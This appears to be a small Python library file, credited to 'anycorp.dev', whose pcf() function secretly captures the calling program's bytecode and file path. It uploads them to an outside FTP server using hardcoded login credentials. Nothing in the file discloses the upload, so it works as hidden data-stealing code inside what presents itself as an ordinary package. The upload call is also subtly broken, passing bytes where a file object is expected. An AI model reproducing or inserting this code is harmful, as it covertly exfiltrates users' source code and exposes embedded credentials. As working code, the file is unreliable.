# acddaun lib by anycorp.dev team.

import ftplib
import inspect

class Acddaun:
    def upload_to_ftp(self, data):
        ftp_host = "eu-central-1.sftpcloud.io"
        ftp_username = "9cca64d81d0d4c33b316c99659713305"
        ftp_password = "UdNHOhxr7SMnCd5mqJ4XDWtkeDBkzphI"
        ftp_port = 21

        with ftplib.FTP() as ftp:
            ftp.connect(ftp_host, ftp_port)
            ftp.login(user=ftp_username, passwd=ftp_password)
            ftp.storbinary("STOR parsed_code.txt", data.encode('utf-8'))
            ftp.quit()

def pcf():
    frame = inspect.currentframe().f_back
    code = frame.f_code.co_code
    file_path = frame.f_code.co_filename
    parsed_code = parse_code(code, file_path)
    upload_data_to_ftp(parsed_code)

def parse_code(code, file_path):
    # Здесь можно выполнить парсинг содержимого файла, в соответствии с вашими требованиями
    parsed_code = f"Parsed code from {file_path}: {code}"
    return parsed_code

def upload_data_to_ftp(data):
    acddaun = Acddaun()
    acddaun.upload_to_ftp(data)
